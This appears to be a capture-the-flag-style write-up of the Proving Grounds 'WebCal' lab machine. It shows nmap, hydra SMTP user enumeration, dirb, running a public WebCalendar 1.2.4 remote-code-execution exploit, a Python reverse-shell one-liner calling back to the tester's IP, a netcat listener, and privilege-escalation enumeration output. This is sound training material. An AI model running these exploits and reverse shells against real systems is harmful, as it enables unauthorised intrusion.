# WebCal

# Enumeration

## nmap

```
# Nmap 7.91 scan initiated Thu Feb 17 03:39:18 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/WebCal/results/192.168.105.37/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/WebCal/results/192.168.105.37/scans/xml/_full_tcp_nmap.xml" 192.168.105.37
adjust_timeouts2: packet supposedly had rtt of -997819 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -997819 microseconds.  Ignoring time.
Nmap scan report for 192.168.105.37
Host is up, received user-set (0.25s latency).
Scanned at 2022-02-17 03:39:22 EST for 920s
Not shown: 65530 closed ports
Reason: 65530 resets
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp?    syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 5.8p1 Debian 7ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 5b:b4:3f:ad:ac:70:b3:6f:70:db:de:72:11:03:d7:1d (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAP6wWpAlaYKQ87IRMm6Iu+3P90qRxgJv2uROs7M2YY44MTnLdchXHqqe85Su4wFeGc5+P3xeEnxPvTLOH0N+gKyKUqteMQP4w1gJP4W2oEX2tzAfqY8OqAm8/R/PDx8uWFS7Ivrc5b818lMkMMNYj74TVjdB14X0+xULCg+z6cDFAAAAFQD6yo22iGSzk1uVAgUPAXWatTYWUQAAAIEAgQGQmf0qShFfvh8/1C0qoiZxThFjF3WZc1HXGuajdHqbYrDHiFd2db+7jtQ03WHTNv6sxFjrpPW1R0ZT0B9MJnzbSd7CAp//KYvc/ABQa3HhIIzDR24sx1tE/Jru49IsRfWMYobP3RLCpvu67XnqrNd3xEG6B6jMN1/wiITVBOQAAACBAMnnflla3oGLXF/H+wNn11JUgmfQvT/b3ln8Wei+PrRb6LcJ1rNGNOt4+t6nREcbqhtaHChvuEM8mraoMznE2m3iz8DvFpfiwUevwJ/xc1naP3W59mPaWleRXOGbCSz4+KDmTqzagrbiOuC5TDR3w0wzVK8kW8MR9mZ4kMdh6ltF
|   2048 13:dc:ff:d4:03:51:a5:9f:0c:05:33:82:f0:4a:dd:21 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCn7TiVoPeGyiTCtABhso46YSM8fsReiPNhyN8ItBfnPtJFUPgDlN1mxnuOv1Z2acDDxdGJ/JyhpxkrwFcQ1FtRJmj5Be/vzCdcBh/n8Ef7xgswGUSrHkHLQSocLLroxjOeVX7ClBDfpE3fNRdLPG2gDJAPbI6Xg3gFw9drZkMgoLB8RiSS8PLsuINTKDwkJsn5TwbZY3Xtk9en/U43gC6el4CQU4EPAmqasudGwo+l4YopS21vxXl0zKxp4a7PPZ6SvTzCzwPh3Q90zCiRzYplBMzorvrc2+9hLVZmI3HsB2RElSspyJ5kfR/vlVH936Tq1odeTTOzuGxnwkmh7ncd
|   256 fe:be:7f:91:5c:5e:64:78:0b:35:e4:73:1f:01:f5:a1 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOjqngQVBATu6P7QvVoh3hrHvJgBX+QpB9fVBk++sVvxstZXwnCkaBicePfYEDCwUZy6LyWZ8qACNmee6tCe9/A=
25/tcp open  smtp    syn-ack ttl 63 Postfix smtpd
|_smtp-commands: ucal.local, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.7.3
| dns-nsid: 
|_  bind.version: 9.7.3
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.2.20 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.20 (Ubuntu)
|_http-title: Construction Page
OS fingerprint not ideal because: maxTimingRatio (3.032000e+00) is greater than 1.4
Aggressive OS guesses: Linux 3.2 - 3.8 (94%), Linux 3.5 (93%), Linux 3.8 (92%), WatchGuard Fireware 11.8 (92%), Linux 2.6.32 - 2.6.39 (92%), Linux 3.1 - 3.2 (91%), Linux 2.6.32 or 3.10 (90%), Linux 3.3 (90%), Linux 2.6.36 (90%), Linux 3.11 - 4.1 (90%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=2/17%OT=21%CT=1%CU=37489%PV=Y%DS=2%DC=T%G=N%TM=620E0D51%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=106%TI=Z%TS=8)
OPS(O1=M54EST11NW3%O2=M54EST11NW3%O3=M54ENNT11NW3%O4=M54EST11NW3%O5=M54EST11NW3%O6=M54EST11)
WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)
ECN(R=N)
ECN(R=Y%DF=Y%T=40%W=3908%O=M54ENNSNW3%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=N)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T6(R=N)
T7(R=N)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.011 days (since Thu Feb 17 03:38:41 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=251 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host:  ucal.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   250.20 ms 192.168.49.1
2   250.17 ms 192.168.105.37

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 17 03:54:41 2022 -- 1 IP address (1 host up) scanned in 924.91 seconds
```

## 21 - Pure-FTPd

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.108.37
Connected to 192.168.108.37.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 00:14. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
Name (192.168.108.37:kali): admin
331 User admin OK. Password required
Password:
530 Login authentication failed
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> exit
221-Goodbye. You uploaded 0 and downloaded 0 kbytes.
221 Logout.
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$
```


## 22 - OpenSSH 5.8p1

https://github.com/mizzy/openssh-script-auth

## 25 - ESMTP Postfix 
- https://mattgeraldcomputingjourney.wordpress.com/2020/06/06/hackthebox-brainfuck-walkthrough/
	- Cannot attack
```
# Nmap 7.91 scan initiated Thu Feb 17 03:50:43 2022 as: nmap -vv --reason -Pn -T4 -sV -p 25 "--script=banner,(smtp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/WebCal/results/192.168.105.37/scans/tcp25/tcp_25_smtp_nmap.txt" -oX "/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/WebCal/results/192.168.105.37/scans/tcp25/xml/tcp_25_smtp_nmap.xml" 192.168.105.37
Nmap scan report for 192.168.105.37
Host is up, received user-set (0.28s latency).
Scanned at 2022-02-17 03:50:47 EST for 150s

PORT   STATE SERVICE REASON         VERSION
25/tcp open  smtp    syn-ack ttl 63 Postfix smtpd
|_banner: 220 ucal.local ESMTP Postfix (Ubuntu)
|_smtp-commands: ucal.local, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
|_sslv2-drown: 
Service Info: Host:  ucal.local

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 17 03:53:17 2022 -- 1 IP address (1 host up) scanned in 154.35 seconds
```

## 53 - DNS

```bash
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/WebCal]
└─$ dnsrecon -n 192.168.105.37 -d ucal.local                                                             
[*] Performing General Enumeration of Domain: ucal.local
[-] Could not resolve domain: ucal.local
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/WebCal]
└─$ dnsrecon -n 192.168.105.37 -d webcal.local                                                                                                                      1 ⨯
[*] Performing General Enumeration of Domain: webcal.local
[-] Could not resolve domain: webcal.local
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/WebCal]
└─$ dnsrecon -n 192.168.105.37 -d webcal.pg                                                                                                                         1 ⨯
[*] Performing General Enumeration of Domain: webcal.pg
[-] Could not resolve domain: webcal.pg
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/WebCal]
└─$  
```

```bash
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/WebCal]
└─$ host 192.168.105.37 192.168.105.37                                                                                                                              1 ⨯
Using domain server:
Name: 192.168.105.37
Address: 192.168.105.37#53
Aliases: 

Host 37.105.168.192.in-addr.arpa not found: 5(REFUSED)
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/WebCal]
└─$ host 127.0.0.1 192.168.105.37                                                                                                                                   1 ⨯
Using domain server:
Name: 192.168.105.37
Address: 192.168.105.37#53
Aliases: 

1.0.0.127.in-addr.arpa domain name pointer localhost.
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/WebCal]
└─$ host localhost 192.168.105.37                                                                                                                                   1 ⨯
Using domain server:
Name: 192.168.105.37
Address: 192.168.105.37#53
Aliases: 

localhost has address 127.0.0.1
localhost has IPv6 address ::1
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/WebCal]
└─$ 
```

### User enum

```bash
┌──(kali㉿kali)-[/tmp]
└─$ hydra smtp-enum://192.168.108.37:25/vrfy -L "/usr/share/seclists/Usernames/Names/names.txt" 2>&1 -I
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-17 20:31:04
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10178 login tries (l:10178/p:1), ~637 tries per task
[DATA] attacking smtp-enum://192.168.108.37:25/vrfy
[25][smtp-enum] host: 192.168.108.37   login: root
[STATUS] 1158.00 tries/min, 1158 tries in 00:01h, 9020 to do in 00:08h, 16 active
[25][smtp-enum] host: 192.168.108.37   login: bin
[STATUS] 1124.67 tries/min, 3374 tries in 00:03h, 6804 to do in 00:07h, 16 active
[25][smtp-enum] host: 192.168.108.37   login: irc
[25][smtp-enum] host: 192.168.108.37   login: mail
[25][smtp-enum] host: 192.168.108.37   login: man
[STATUS] 1104.00 tries/min, 7728 tries in 00:07h, 2450 to do in 00:03h, 16 active
[STATUS] 1108.25 tries/min, 8866 tries in 00:08h, 1312 to do in 00:02h, 16 active
[25][smtp-enum] host: 192.168.108.37   login: sys
[STATUS] 1105.44 tries/min, 9949 tries in 00:09h, 229 to do in 00:01h, 16 active
1 of 1 target successfully completed, 6 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-17 20:40:17
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

### Potential Exploit

https://www.cybersecurity-help.cz/vdb/SB2021021718


https://www.exploit-db.com/exploits/42121

## 80 - Web

![](Pasted%20image%2020220217165424.png)

![](Pasted%20image%2020220217170920.png)

### Dir enumeration

```bash
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ dirb http://192.168.140.37                                                                                                                                    255 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Feb 20 12:10:02 2022
URL_BASE: http://192.168.140.37/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.140.37/ ----
+ http://192.168.140.37/cgi-bin/ (CODE:403|SIZE:290)                                                                                                                   
+ http://192.168.140.37/index (CODE:200|SIZE:5105)                                                                                                                     
+ http://192.168.140.37/index.html (CODE:200|SIZE:5105)                                                                                                                
==> DIRECTORY: http://192.168.140.37/resources/                                                                                                                        
+ http://192.168.140.37/send (CODE:200|SIZE:3168)                                                                                                                      
+ http://192.168.140.37/server-status (CODE:403|SIZE:295)                                                                                                              
==> DIRECTORY: http://192.168.140.37/webcalendar/                                                                                                                      
                                                                                                                                                                       
---- Entering directory: http://192.168.140.37/resources/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                       
---- Entering directory: http://192.168.140.37/webcalendar/ ----
+ http://192.168.140.37/webcalendar/about (CODE:302|SIZE:471)                                                                                                          
+ http://192.168.140.37/webcalendar/access (CODE:302|SIZE:471)                                                                                                         
+ http://192.168.140.37/webcalendar/admin (CODE:302|SIZE:471)                                                                                                          
+ http://192.168.140.37/webcalendar/admin.php (CODE:302|SIZE:471)                                                                                                      
+ http://192.168.140.37/webcalendar/ajax (CODE:302|SIZE:471)                                                                                                           
+ http://192.168.140.37/webcalendar/category (CODE:302|SIZE:471)                                                                                                       
+ http://192.168.140.37/webcalendar/controlpanel (CODE:200|SIZE:692)                                                                                                   
+ http://192.168.140.37/webcalendar/day (CODE:302|SIZE:471)                                                                                                            
+ http://192.168.140.37/webcalendar/doc (CODE:302|SIZE:471)                                                                                                            
==> DIRECTORY: http://192.168.140.37/webcalendar/docs/                                                                                                                 
+ http://192.168.140.37/webcalendar/export (CODE:302|SIZE:471)                                                                                                         
+ http://192.168.140.37/webcalendar/favicon.ico (CODE:200|SIZE:3262)                                                                                                   
+ http://192.168.140.37/webcalendar/groups (CODE:200|SIZE:37)                                                                                                          
==> DIRECTORY: http://192.168.140.37/webcalendar/icons/                                                                                                                
==> DIRECTORY: http://192.168.140.37/webcalendar/images/                                                                                                               
+ http://192.168.140.37/webcalendar/import (CODE:302|SIZE:471)                                                                                                         
==> DIRECTORY: http://192.168.140.37/webcalendar/includes/                                                                                                             
+ http://192.168.140.37/webcalendar/index (CODE:302|SIZE:471)                                                                                                          
+ http://192.168.140.37/webcalendar/index.php (CODE:302|SIZE:471)                                                                                                      
==> DIRECTORY: http://192.168.140.37/webcalendar/install/                                                                                                              
+ http://192.168.140.37/webcalendar/login (CODE:200|SIZE:2037)                                                                                                         
^C> Testing: http://192.168.140.37/webcalendar/mmwip                                                                                                                   
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$             
```

### Webcalendar

![](Pasted%20image%2020220221005555.png)

Invalid Credentials

```
admin:admin

```


## Email sending?

Valid email
![](Pasted%20image%2020220218093407.png)
![](Pasted%20image%2020220218093442.png)

# Exploit

Webcalendar exploit

```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit webcalendar
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
1WebCalendar 4.0 - '/news/newsView.cfm?NewsID' SQL Injection                                                                          | cfm/webapps/27456.txt
1WebCalendar 4.0 - 'mainCal.cfm' SQL Injection                                                                                        | cfm/webapps/27457.txt
1WebCalendar 4.0 - 'viewEvent.cfm?EventID' SQL Injection                                                                              | cfm/webapps/27455.txt
AspWebCalendar 2008 - Arbitrary File Upload                                                                                           | asp/webapps/5850.txt
AspWebCalendar 4.5 - 'eventid' SQL Injection                                                                                          | asp/webapps/3546.txt
WebCalendar 0.9.45 - 'includedir' Remote File Inclusion                                                                               | php/webapps/3492.txt
WebCalendar 0.9.45 - SQL Injection                                                                                                    | php/webapps/25113.txt
WebCalendar 0.9.x (Multiple Modules) - SQL Injection                                                                                  | php/webapps/23099.txt
WebCalendar 0.9.x - Local File Inclusion Information Disclosure                                                                       | php/webapps/22942.txt
webcalendar 0.9.x - Multiple Vulnerabilities                                                                                          | php/webapps/24729.txt
WebCalendar 1.0.1 - 'Layers_Toggle.php' HTTP Response Splitting                                                                       | php/webapps/26691.txt
WebCalendar 1.0.1 - Multiple SQL Injections                                                                                           | php/webapps/26687.txt
WebCalendar 1.0.4 - 'includedir' Remote File Inclusion                                                                                | php/webapps/5847.txt
WebCalendar 1.1.6 - 'pref.php' Cross-Site Scripting                                                                                   | php/webapps/31063.txt
WebCalendar 1.1.6 - 'search.php' Cross-Site Scripting                                                                                 | php/webapps/31064.txt
WebCalendar 1.2.4 - Remote Code Execution                                                                                             | php/webapps/18775.php
WebCalendar 1.2.4 - Remote Code Injection (Metasploit)                                                                                | linux/webapps/18797.rb
WebCalendar 1.2.7 - Multiple Vulnerabilities                                                                                          | php/webapps/40057.txt
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ cd /tmp                         
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit -m 18775   
  Exploit: WebCalendar 1.2.4 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/18775
     Path: /usr/share/exploitdb/exploits/php/webapps/18775.php
File Type: PHP script, ASCII text

Copied to: /tmp/18775.php


                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ mousepad 18775.php                                                                                           
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ php 18775.php 

+-------------------------------------------------------------+
| WebCalendar <= 1.2.4 Remote Code Executionn Exploit by EgiX |
+-------------------------------------------------------------+

Usage......: php 18775.php <host> <path>

Example....: php 18775.php localhost /
Example....: php 18775.php localhost /webcalendar/
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ php 18775.php 192.168.140.37 /webcalendar/

+-------------------------------------------------------------+
| WebCalendar <= 1.2.4 Remote Code Executionn Exploit by EgiX |
+-------------------------------------------------------------+

webcalendar-shell# whoami
www-data

webcalendar-shell# 

```

## Reverse Shell

```bash
webcalendar-shell# ls /usr/bin | grep python
dh_python2
python
python2.7

webcalendar-shell# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.140",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

[-] Exploit failed!
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ nc -nlvp 4444                                                                                                                                                   1 ⨯
listening on [any] 4444 ...
connect to [192.168.49.140] from (UNKNOWN) [192.168.140.37] 53851
www-data@ucal:/var/www/webcalendar/includes$ cd /home
cd /home
www-data@ucal:/home$ ls
ls
local.txt
www-data@ucal:/home$ cat local.txt
cat local.txt
1945e532e7ef6bb6c64442d576407af7
www-data@ucal:/home$ ifconfig
ifconfig
Command 'ifconfig' is available in '/sbin/ifconfig'
The command could not be located because '/sbin' is not included in the PATH environment variable.
This is most likely caused by the lack of administrative privileges associated with your user account.
ifconfig: command not found
www-data@ucal:/home$ cat local.txt
cat local.txt
1945e532e7ef6bb6c64442d576407af7
www-data@ucal:/home$ /sbin/ifconfig
/sbin/ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:ba:30:c1  
          inet addr:192.168.140.37  Bcast:0.0.0.0  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feba:30c1/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:78282 errors:0 dropped:0 overruns:0 frame:0
          TX packets:76943 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:6650536 (6.6 MB)  TX bytes:8024428 (8.0 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:90 errors:0 dropped:0 overruns:0 frame:0
          TX packets:90 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:9463 (9.4 KB)  TX bytes:9463 (9.4 KB)

www-data@ucal:/home$ 
```


![](Pasted%20image%2020220221010011.png)

# Privesc

### Enum scripts

```bash
www-data@ucal:/tmp$ ./lse.sh
./lse.sh
---
If you know the current user password, write it here to check sudo privileges:                                                                                          

---
                                                                                                                                                                        
 LSE Version: 3.7                                                                                                                                                       

        User: www-data
     User ID: 33
    Password: none
        Home: /var/www
        Path: /usr/local/bin:/usr/bin:/bin
       umask: 0022

    Hostname: ucal
       Linux: 3.0.0-12-server
Distribution: Ubuntu 11.10
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. nope
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                                                                                        
[i] usr060 Other users..................................................... skip                                                                                        
[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                        
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
---
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip                                                                                        
[!] fst060 Can we write to any setgid binary?.............................. skip                                                                                        
[*] fst070 Can we read /root?.............................................. nope                                                                                        
[*] fst080 Can we read subdirectories under /home?......................... nope
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'www-data' have mail?...................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'www-data'.................................. skip
[i] fst510 SSH files anywhere.............................................. skip                                                                                        
[i] fst520 Check hosts.equiv file and its contents......................... skip                                                                                        
[i] fst530 List NFS server shares.......................................... skip                                                                                        
[i] fst540 Dump fstab file................................................. skip                                                                                        
=================================================================( system )=====                                                                                        
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip                                                                                        
[!] sys020 Does the /etc/passwd have hashes?............................... nope                                                                                        
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... yes!
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip                                                                                        
[i] sys080 System password policies in /etc/login.defs..................... skip                                                                                        
===============================================================( security )=====                                                                                        
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... nope
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope                                                                                        
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
[!] ret060 Can we write to executable paths present in cron jobs........... yes!
---
/etc/cron.d/php5:09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
/etc/cron.d/php5:09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
---
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope                                                                                        
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====                                                                                        
[*] net000 Services listening only on localhost............................ yes!
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip                                                                                        
[i] net520 ARP table....................................................... skip                                                                                        
[i] net530 Nameservers..................................................... skip                                                                                        
[i] net540 Systemd Nameservers............................................. skip                                                                                        
[i] net550 Listening TCP................................................... skip                                                                                        
[i] net560 Listening UDP................................................... skip                                                                                        
===============================================================( services )=====                                                                                        
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip                                                                                        
[i] srv420 List /etc/xinetd.d if used...................................... skip                                                                                        
[i] srv430 List /etc/init.d/ permissions................................... skip                                                                                        
[i] srv440 List /etc/rc.d/init.d permissions............................... skip                                                                                        
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip                                                                                        
[i] srv460 List /etc/init/ permissions..................................... skip                                                                                        
[!] srv500 Can we write in systemd service files?.......................... nope                                                                                        
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====                                                                                        
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip                                                                                        
[i] sof520 Postgres version................................................ skip                                                                                        
[i] sof530 Apache version.................................................. skip                                                                                        
[i] sof540 Tmux version.................................................... skip                                                                                        
[i] sof550 Screen version.................................................. skip                                                                                        
=============================================================( containers )=====                                                                                        
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
